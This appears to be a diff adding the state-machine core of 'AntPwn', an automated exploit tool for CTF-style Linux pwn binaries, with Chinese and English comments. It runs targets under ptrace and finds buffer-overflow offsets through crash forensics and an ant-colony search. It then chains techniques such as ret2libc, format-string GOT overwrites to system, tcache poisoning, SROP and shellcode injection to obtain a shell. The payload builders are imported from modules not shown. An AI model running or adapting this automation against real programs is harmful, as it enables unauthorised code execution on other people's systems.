@@ -1,0 +1,572 @@
+"""AntPwn FSM: exploit state machine with fallback transitions
+解题状态机: RECON -> DECOMPILE -> SCAN -> STRATEGY -> OFFSET(ACO) -> BUILD
+            -> TEST -> VERIFY, 任一阶段失败自动回退换策略重试
+"""
+import struct
+import time
+
+from . import i18n
+from .aco import AntColony
+from .debugger import Process
+from .exploits import ExploitContext, ALL_STRATEGIES, cyclic, cyclic_find, p64
+from .gadgets import GadgetFinder
+
+
+class State:
+    RECON = "recon"
+    DECOMPILE = "decompile"
+    SCAN = "scan"
+    STRATEGY = "strategy"
+    OFFSET = "offset"
+    BUILD = "build"
+    TEST = "test"
+    VERIFY = "verify"
+    DONE = "done"
+    FAILED = "failed"
+
+
+STATE_ORDER = [State.RECON, State.DECOMPILE, State.SCAN, State.STRATEGY,
+               State.OFFSET, State.BUILD, State.TEST, State.VERIFY]
+
+
+class Logger:
+    def __init__(self, verbose=True):
+        self.verbose = verbose
+        self.records = []
+
+    def log(self, state, msg):
+        line = f"[{state:>10}] {msg}"
+        self.records.append(line)
+        if self.verbose:
+            print(line)
+
+    def raw(self, msg):
+        self.records.append(msg)
+        if self.verbose:
+            print(msg)
+
+
+class FSM:
+    def __init__(self, path, log=None, lang="zh"):
+        i18n.set_lang(lang)
+        self.path = path
+        self.log = log or Logger()
+        self.state = State.RECON
+        self.trace = []           # (state, event, next_state)
+        self.report_data = {
+            "path": path, "mitigations": {}, "functions": [], "findings": [],
+            "strategies": [], "offset": None, "aco": [], "notes": [],
+            "result": None, "steps": [],
+        }
+
+    # ------------------------------------------------------------------
+    def transition(self, ev, ok):
+        """deterministic transition table with fallback edges"""
+        cur = self.state
+        if ok:
+            if cur in STATE_ORDER:
+                nxt = STATE_ORDER[STATE_ORDER.index(cur) + 1] if cur != State.VERIFY else State.DONE
+            else:
+                nxt = State.DONE
+        else:
+            # fallback edges
+            nxt = {State.DECOMPILE: State.SCAN,   # decompile fail -> still scan
+                   State.SCAN: State.STRATEGY,
+                   State.STRATEGY: State.STRATEGY,  # try next strategy
+                   State.OFFSET: State.STRATEGY,
+                   State.BUILD: State.STRATEGY,
+                   State.TEST: State.STRATEGY,
+                   State.VERIFY: State.STRATEGY}.get(cur, State.FAILED)
+        self.trace.append((cur, ev, nxt))
+        self.log.log(i18n.t("state"), f"{cur} --{ev}{'[ok]' if ok else '[x]'}--> {nxt}")
+        self.state = nxt
+        return nxt
+
+    # ------------------------------------------------------------------
+    def run(self):
+        from .elf import ELF
+        from .scanner import Scanner
+
+        # ---- RECON ----
+        try:
+            self.elf = ELF(self.path)
+        except Exception as e:
+            self.log.log(State.RECON, f"{i18n.t('not_pwn')}: {e}")
+            self.report_data["result"] = "not_elf"
+            return False
+        m = self.report_data["mitigations"]
+        m["arch"] = "x86-64"
+        m["pie"] = self.elf.is_pie
+        m["nx"] = self.elf.has_nx
+        m["execstack"] = self.elf.has_execstack
+        m["canary"] = self.elf.canary
+        m["relro"] = self.elf.relro
+        self.log.log(State.RECON, f"PIE={m['pie']} NX={m['nx']} Canary={m['canary']} "
+                                  f"RELRO={m['relro']} execstack={m['execstack']}")
+        self.transition("recon", True)
+
+        # ---- DECOMPILE ----
+        try:
+            self.scanner = Scanner(self.elf)
+            fns = self.scanner.scan()
+            for name, pf in self.scanner.funcs.items():
+                self.report_data["functions"].append(
+                    {"name": name, "addr": pf.addr,
+                     "pseudo": None, "calls": pf.calls})
+            self.log.log(State.DECOMPILE,
+                         f"{i18n.t('decompile')}: {len(self.scanner.funcs)} functions")
+            self.transition("decompile", True)
+        except Exception as e:
+            self.log.log(State.DECOMPILE, f"decompile partial failure: {e}")
+            self.transition("decompile", False)
+
+        # ---- SCAN ----
+        for f in self.scanner.findings:
+            self.report_data["findings"].append(
+                {"kind": f.kind, "func": f.func, "addr": f.addr,
+                 "detail": f.text, "score": f.score})
+        for f in self.scanner.findings[:12]:
+            self.log.log(State.SCAN, f"  {i18n.t('found')}: [{f.kind}] {f.func} @ {f.addr:#x} — {f.text}")
+        self.transition("scan", True)
+
+        # ---- STRATEGY (v1.2: ants walk the capability DAG) ----
+        gadgets = GadgetFinder(self.elf)
+        ctx = ExploitContext(self.elf, self.scanner, gadgets, self.log)
+        self.ctx = ctx
+
+        from .graph import Colony
+        colony = Colony(self.build_edges(ctx), self.log)
+        trail, ok = colony.solve(ctx)
+        self.report_data["strategies"] = [e.name for e, _ in (trail or [])]
+        self.report_data["aco"] = colony.history if hasattr(colony, "history") else []
+        if ok:
+            self.state = State.VERIFY
+            self.transition("verify", True)
+            self.report_data["result"] = "pwned:dag"
+            self.report_data["notes"] = ctx.notes
+            self.log.log(State.VERIFY, i18n.t("shell_ok"))
+            return True
+
+        # ---- legacy linear fallback (safety net) ----
+        tried = []
+        strategies = [S(ctx) for S in ALL_STRATEGIES]
+        candidates = [s for s in strategies if s.feasible()]
+        # order: specific before generic
+        prio = {"fmt": 0, "heap": 1, "ret2text": 2, "pivot": 3, "srop": 4,
+                "ret2libc": 5, "ret2syscall": 6, "shellcode": 7}
+        candidates.sort(key=lambda s: prio.get(s.name, 9))
+        self.log.log(State.STRATEGY,
+                     f"feasible strategies: {[s.name for s in candidates] or 'none'}")
+        self.report_data["strategies"] = [s.name for s in candidates]
+        if not candidates:
+            self._explain_no_strategy()
+
+        for strat in candidates:
+            self.state = State.STRATEGY
+            tried.append(strat.name)
+            self.log.log(State.STRATEGY, f"==> {i18n.t(strat.key)}")
+            self.report_data["steps"].append(f"strategy: {strat.name}")
+            # ---- OFFSET via ACO (stack strategies only) ----
+            if strat.name in ("ret2text", "ret2libc", "ret2syscall",
+                              "shellcode", "srop", "pivot"):
+                if ctx.offset is None:
+                    ok = self.find_offset(strat)
+                    if not ok:
+                        self.transition("offset", False)
+                        continue
+                self.transition("offset", True)
+            # ---- BUILD + TEST + VERIFY ----
+            self.transition("build", True)
+            try:
+                ok = strat.run()
+            except Exception as e:
+                import traceback
+                self.log.raw(f"    ! exploit error: {e}")
+                self.log.raw("      " + traceback.format_exc().replace("\n", "\n      ").rstrip())
+                ok = False
+            self.transition("test", ok)
+            if ok:
+                self.state = State.VERIFY
+                self.transition("verify", True)
+                self.report_data["result"] = f"pwned:{strat.name}"
+                self.report_data["notes"] = ctx.notes
+                self.log.log(State.VERIFY, i18n.t("shell_ok"))
+                return True
+            else:
+                self.log.raw(f"    [x] {i18n.t('failed')} (strategy={strat.name})")
+                ctx.offset = None  # offset may differ per strategy
+        self.state = State.FAILED
+        self.report_data["result"] = "failed"
+        self.report_data["notes"] = ctx.notes
+        self.report_data["tried"] = tried
+        return False
+
+    # ------------------------------------------------------------------
+    def dt_find_offset(self, preamble=b""):
+        """decision-tree offset inference: crash once, decode the cyclic
+        pattern from forensic registers, then VERIFY each candidate with a
+        marker probe (stack data copies can mimic the pattern).
+        `preamble` models multi-read programs: bytes consumed before the
+        overflowing read (the offset is preamble-relative)."""
+        pat = cyclic(700)
+        proc = None
+        cands = []
+        try:
+            proc = Process(self.path)
+            proc.start()
+            proc.send(preamble + pat + b"\n")
+            proc.close_stdin()
+            ev = proc.cont(timeout=1.5)
+            if ev[0] not in ("stop", "trap"):
+                return None                      # branch: no crash at all
+            regs = proc.getregs()
+
+            def pat_off(raw):
+                # 8-byte window is unambiguous in our base-26 cyclic; the
+                # 7-byte fallback is accepted only when unique in the pattern
+                b = (raw & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
+                i = pat.find(b)
+                if i >= 0:
+                    return i
+                j = pat.find(b[:7])
+                if j >= 0 and pat.find(b[:7], j + 1) < 0:
+                    return j
+                return None
+
+            # branch 1: rip itself carries the pattern -> exact offset
+            off = pat_off(regs.rip)
+            if off is not None and 0 < off < 600:
+                cands.append(off)
+            # branch 2: saved rbp smashed -> return address sits 8 later
+            off = pat_off(regs.rbp)
+            if off is not None and 0 < off < 600:
+                cands.append(off + 8)
+            # branch 3: scan stack for the smashed return slot (weakest
+            # evidence: stack may hold COPIES of our data, not the slot)
+            try:
+                stack = proc.read_mem(regs.rsp, 96)
+                for i in range(0, len(stack) - 7, 8):
+                    j = pat.find(stack[i:i + 8])
+                    if j >= 0 and 0 < j < 600:
+                        cands.append(j)
+            except Exception:
+                pass
+            proc.kill()
+        except Exception:
+            if proc:
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
+        # verification probes: a true offset puts a marker into RIP
+        marker = 0xBEEFCAFE
+        for cand in dict.fromkeys(cands):
+            if self.crash_score(cand, marker, preamble) >= 1.0:
+                return cand
+        return None                # undecidable -> caller falls back to ACO
+
+    # ------------------------------------------------------------------
+    def build_edges(self, ctx):
+        """wire the capability DAG: techniques are edges, strategies become
+        single-shot or staged edge executors"""
+        from .exploits import (Ret2Text, Ret2Libc, Ret2Syscall, FmtGOT,
+                               Shellcode, SROP, StackPivot, HeapUAF)
+        from .graph import (Technique, CAP_RIP, CAP_LIBC, CAP_FMTK,
+                            CAP_HEAP, CAP_SHELL, SESSION, PROCESS)
+        fsm = self
+        r2l, fmt, heap = Ret2Libc(ctx), FmtGOT(ctx), HeapUAF(ctx)
+
+        class _Dummy:
+            probe_preamble = staticmethod(lambda: b"")
+
+        def _preambles():
+            """input-stream variants: bytes consumed before the overflowing
+            read differ per technique (multi-read programs)"""
+            variants = [b""]
+            for S in (StackPivot,):
+                try:
+                    p = S(ctx).probe_preamble()
+                except Exception:
+                    p = b""
+                if p and p not in variants:
+                    variants.append(p)
+            return variants
+
+        def t_offset(c):
+            # decision-tree forensics per input-stream variant; offsets are
+            # stored per preamble so each edge uses its own semantics
+            found = {}
+            for pre in _preambles():
+                off = fsm.dt_find_offset(pre)
+                if off is not None:
+                    found[pre] = off
+                    fsm.log.log(State.OFFSET,
+                                f"决策树取证 (preamble={len(pre)}B): 偏移 = {off}")
+            if found:
+                c.offsets_map.update(found)   # session knowledge: survives ants
+                c.offset = found.get(b"", next(iter(found.values())))
+                return True
+            return fsm.find_offset(_Dummy())   # ACO fallback (noisy cases)
+
+        _pv = StackPivot(ctx)
+
+        def _pv_pre():
+            try:
+                p = _pv.probe_preamble()
+            except Exception:
+                p = b""
+            return p if p else None
+
+        def t_fmt_k(c):
+            if c.fmt_k:
+                return True
+            k = fmt.find_k()
+            if k:
+                c.fmt_k = k
+            return bool(k)
+
+        def t_fmt_backdoor(c):
+            gm = c.elf.got_map()
+            win = c.backdoor_addr()
+            if win is None or "printf" not in gm:
+                return False
+            return fmt._run_backdoor(c.fmt_k, gm["printf"], win)
+
+        def t_fmt_leak(c):
+            return fmt.stage_leak_libc(c.fmt_k, c.elf.got_map())
+
+        def t_fmt_pwn(c):
+            return fmt.stage_pwn_libc(c.fmt_k, c.elf.got_map())
+
+        def _relro_open(c):
+            return c.elf.relro != "full"
+
+        return [
+            Technique("dt-offset", [], [CAP_RIP], t_offset,
+                      feasible=lambda c: "bof" in c.vuln_kinds, scope=SESSION,
+                      prio=0, zh="崩溃取证推断偏移 (ACO 兜底)",
+                      en="crash forensics infers the offset (ACO fallback)"),
+            Technique("ret2text", [CAP_RIP], [CAP_SHELL], lambda c, _s=Ret2Text(ctx): _s.run(),
+                      feasible=lambda c: "backdoor" in c.vuln_kinds
+                      and not c.elf.is_pie and not c.elf.canary,
+                      prio=1, zh="跳转到程序自带后门函数",
+                      en="jump to the binary's own backdoor"),
+            Technique("heap-leak", [], [CAP_HEAP], lambda c: heap.stage_heap_leak(),
+                      feasible=lambda c: "heap" in c.vuln_kinds, scope=PROCESS,
+                      prio=2, zh="UAF 双读推出精确堆地址",
+                      en="two UAF reads recover exact heap addresses"),
+            Technique("heap-forge", [CAP_HEAP], [CAP_LIBC], lambda c: heap.stage_forge(),
+                      scope=PROCESS, prio=2,
+                      zh="tcache poisoning 伪造槽位 -> 泄露 libc",
+                      en="tcache poisoning forges a slot -> libc leak"),
+            Technique("heap-pwn", [CAP_HEAP, CAP_LIBC], [CAP_SHELL],
+                      lambda c: heap.stage_trigger(), prio=2,
+                      zh="free@GOT 改 system 并触发",
+                      en="rewrite free@GOT to system and trigger"),
+            Technique("fmt-k", [], [CAP_FMTK], t_fmt_k,
+                      feasible=lambda c: "fmt" in c.vuln_kinds, scope=SESSION,
+                      prio=0, zh="%p 喷射定位缓冲区参数位置",
+                      en="%p spray locates the buffer's vararg index"),
+            Technique("fmt-backdoor", [CAP_FMTK], [CAP_SHELL], t_fmt_backdoor,
+                      feasible=lambda c: "fmt" in c.vuln_kinds
+                      and "backdoor" in c.vuln_kinds and _relro_open(c),
+                      prio=1, zh="%hn 把 printf@GOT 改成后门",
+                      en="%hn points printf@GOT at the backdoor"),
+            Technique("fmt-leak", [CAP_FMTK], [CAP_LIBC], t_fmt_leak,
+                      feasible=lambda c: "fmt" in c.vuln_kinds
+                      and _relro_open(c) and c.has_leak_function,
+                      scope=PROCESS, prio=3,
+                      zh="%k$s 泄露 GOT 里的 libc 地址",
+                      en="%k$s leaks a libc pointer from the GOT"),
+            Technique("fmt-pwn", [CAP_FMTK, CAP_LIBC], [CAP_SHELL], t_fmt_pwn,
+                      prio=3, zh="printf@GOT 改 system, 输入 /bin/sh 触发",
+                      en="printf@GOT -> system; '/bin/sh' input triggers it"),
+            Technique("pivot", [CAP_RIP], [CAP_SHELL], lambda c, _s=_pv: _s.run(),
+                      feasible=lambda c, _f=_pv.feasible: _f(), prio=4,
+                      zh="栈迁移到可写段再 ROP",
+                      en="stack pivot into a writable segment, then ROP",
+                      preamble=_pv_pre()),
+            Technique("srop", [CAP_RIP], [CAP_SHELL], lambda c, _s=SROP(ctx): _s.run(),
+                      feasible=lambda c, _f=SROP(ctx).feasible: _f(), prio=5,
+                      zh="伪造信号帧 SROP 直接 execve",
+                      en="forge a signal frame; SROP execve"),
+            Technique("libc-leak", [CAP_RIP], [CAP_LIBC], lambda c: r2l.stage_leak(),
+                      feasible=lambda c: "bof" in c.vuln_kinds
+                      and not c.elf.is_pie and not c.elf.canary
+                      and c.has_rop_gadgets and bool(c.elf.sym("puts"))
+                      and bool(c.elf.sym("read")),
+                      scope=PROCESS, prio=5,
+                      zh="ROP 调 puts 泄露 libc 基址",
+                      en="ROP into puts to leak the libc base"),
+            Technique("libc-pwn", [CAP_LIBC, CAP_RIP], [CAP_SHELL],
+                      lambda c: r2l.stage_pwn(), prio=5,
+                      zh="system(\"/bin/sh\") 二次返回 getshell",
+                      en="system(\"/bin/sh\") on the second return"),
+            Technique("syscall", [CAP_RIP], [CAP_SHELL], lambda c, _s=Ret2Syscall(ctx): _s.run(),
+                      feasible=lambda c, _f=Ret2Syscall(ctx).feasible: _f(), prio=6,
+                      zh="纯 ROP 链 syscall execve",
+                      en="pure ROP chain syscall execve"),
+            Technique("shellcode", [CAP_RIP], [CAP_SHELL], lambda c, _s=Shellcode(ctx): _s.run(),
+                      feasible=lambda c, _f=Shellcode(ctx).feasible: _f(), prio=7,
+                      zh="可执行栈注入 shellcode",
+                      en="inject shellcode on the exec stack"),
+        ]
+
+    # ------------------------------------------------------------------
+    def _explain_no_strategy(self):
+        """beginner-friendly diagnosis: why is nothing feasible?"""
+        zh, en = [], []
+        g = self.ctx.gadgets.find_all()
+        gm = self.elf.got_map()
+        kinds = {f.kind for f in self.scanner.findings}
+        if "bof" not in kinds and "fmt" not in kinds and "heap" not in kinds:
+            zh.append("没有发现内存破坏类漏洞 (溢出/格式化字符串/UAF)")
+            en.append("no memory-corruption bug found (overflow / fmt / UAF)")
+        if self.elf.is_pie:
+            zh.append("开了 PIE: 地址随机化, 需要先泄露程序基址才有得打")
+            en.append("PIE is on: need a program-base leak first")
+        if self.elf.canary and "bof" in kinds:
+            zh.append("开了 Canary: 栈溢出需先泄露/绕过 canary")
+            en.append("Canary is on: overflow needs a canary leak/bypass")
+        if "bof" in kinds and not self.elf.is_pie and not self.elf.canary:
+            if "pop rdi" not in g:
+                zh.append("二进制里没有 pop rdi 这类 gadget, 无法构造 ROP 链 "
+                          "(真实比赛通常会在题里留下 gadget)")
+                en.append("no 'pop rdi'-style gadget in the binary; ROP chain "
+                          "cannot be built (real CTFs usually leave gadgets)")
+            if "backdoor" not in kinds and "sh_string" not in kinds:
+                zh.append("没有后门函数和 /bin/sh 字符串, 只有 ret2libc 一条路, "
+                          "而它需要 puts/printf 等输出函数做泄露")
+                en.append("no backdoor or /bin/sh string; ret2libc is the only "
+                          "route and needs an output function to leak")
+        if not gm:
+            zh.append("程序不使用动态库符号 (静态或极简), 无法走 GOT 泄露")
+            en.append("no dynamic symbols (static/minimal binary); GOT leak unavailable")
+        if not zh:
+            zh.append("漏洞组合暂不支持自动利用, 查看报告细节")
+            en.append("this bug combination is not auto-exploitable yet; see report")
+        for a, b in zip(zh, en):
+            self.ctx.note(a, b)
+            self.log.log(State.STRATEGY, f"  ? {a if i18n.LANG == 'zh' else b}")
+
+    # ------------------------------------------------------------------
+    def find_offset(self, strat):
+        """ACO-driven dynamic offset search: ants probe offsets, fitness =
+        degree of RIP control measured via ptrace crash analysis"""
+        marker = 0xBEEFCAFE  # canonical (<2^48, bit47=0), no 0x0a bytes
+        # ---- crashability pre-check: a long junk payload must disturb RIP ----
+        pre = getattr(strat, "probe_preamble", lambda: b"")()
+        probe = self.crash_score(24, marker, pre)
+        long_probe = self._crash_long(pre)
+        if probe == 0.0 and not long_probe:
+            self.log.log(State.OFFSET,
+                         "长 payload 也不会崩溃: 程序疑似无栈溢出, 跳过偏移搜索")
+            return False
+        base_guess = self.static_buf_estimate()
+        if base_guess:
+            lo, hi = max(8, base_guess - 40), base_guess + 120
+        else:
+            lo, hi = 8, 264
+        dims = [list(range(lo, hi, 8))]
+        self.log.log(State.OFFSET,
+                     f"ant colony searching offset in [{lo},{hi}) "
+                     f"(static hint: buf~{base_guess})")
+
+        def fitness(vals):
+            off = vals[0]
+            # strategy may provide a preamble (multi-read programs)
+            pre = getattr(strat, "probe_preamble", lambda: b"")()
+            return self.crash_score(off, marker, pre)
+
+        colony = AntColony(dims, fitness, ants=12, iters=8, seed=1337)
+        best, score = colony.run(
+            on_iter=lambda it, k, vals, s: self.log.log(
+                State.OFFSET,
+                f"  iter{it} ant{k}: off={vals[0] if vals else '-'} score={s:.2f}")
+            if k >= 0 else None)
+        self.report_data["aco"] = colony.history
+        if best and score >= 1.0:
+            self.ctx.offset = best[0]
+            self.log.log(State.OFFSET,
+                         f"{i18n.t('ants_converged')}: {i18n.t('offset_found')} = {best[0]}")
+            return True
+        if best and score > 0:
+            self.ctx.offset = best[0]
+            self.log.log(State.OFFSET, f"best partial control at {best[0]} (score {score:.2f})")
+            return score >= 0.99
+        return False
+
+    def _crash_long(self, preamble=b""):
+        """does a 300-byte junk payload crash the program at all?"""
+        try:
+            proc = Process(self.path)
+            proc.start()
+            proc.send(preamble + b"J" * 300 + b"\n")
+            proc.close_stdin()
+            ev = proc.cont(timeout=1.2)
+            proc.kill()
+        except Exception:
+            return False
+        return ev[0] in ("stop", "killed")
+
+    def crash_score(self, off, marker, preamble=b""):
+        """run target under ptrace with cyclic+marker payload; return control score"""
+        proc = None
+        try:
+            proc = Process(self.path)
+            proc.start()
+            payload = preamble + cyclic(off) + p64(marker) + b"\n"
+            proc.send(payload)
+            proc.close_stdin()  # EOF: blocked reads return instead of hanging
+            ev = proc.cont(timeout=1.5)
+            regs = proc.getregs()
+            proc.kill()
+        except Exception:
+            if proc:
+                proc.kill()
+            return 0.0
+        if ev[0] not in ("stop", "trap"):
+            return 0.0
+        if regs.rip == marker:
+            return 1.0
+        # partial credit: marker appears in any register or on stack near rsp
+        if marker in (regs.rdi, regs.rsi, regs.rdx, regs.rax, regs.rbp):
+            return 0.6
+        return 0.0
+
+    def static_buf_estimate(self):
+        """generic buf-size hint from disassembly: prefer the function that
+        contains the overflow finding (any name), else any function; use
+        `sub rsp, N` or the widest [rbp-N] reference"""
+        from .disasm import Disasm
+        # rank functions: overflow-function first, then everything else
+        bof = self.ctx.bof_finding() if self.ctx else None
+        funcs = sorted(self.elf.functions(), key=lambda s: 0 if (bof and s.name == bof.func) else 1)
+        for sym in funcs:
+            if not sym.value or (sym.size == 0 and sym.name != (bof.func if bof else "")):
+                continue
+            code = self.elf.read(sym.value, sym.size or 0x100)
+            if not code:
+                continue
+            dis = Disasm(code, sym.value)
+            sub_rsp = None
+            max_rbp = 0
+            for ins in dis.linear(len(code)):
+                if ins.mnem == "sub" and len(ins.ops) == 2 and ins.ops[0] == "rsp":
+                    try:
+                        n = int(ins.ops[1], 16)
+                        if 0 < n < 0x400:
+                            sub_rsp = n
+                    except ValueError:
+                        pass
+                for op in ins.ops:
+                    if "[rbp-0x" in op:
+                        try:
+                            n = int(op.split("rbp-")[1].rstrip("]"), 16)
+                            max_rbp = max(max_rbp, n)
+                        except ValueError:
+                            pass
+            hint = sub_rsp or (max_rbp if max_rbp else None)
+            if hint and 8 <= hint <= 0x400:
+                return hint + 8  # + saved rbp
+        return None
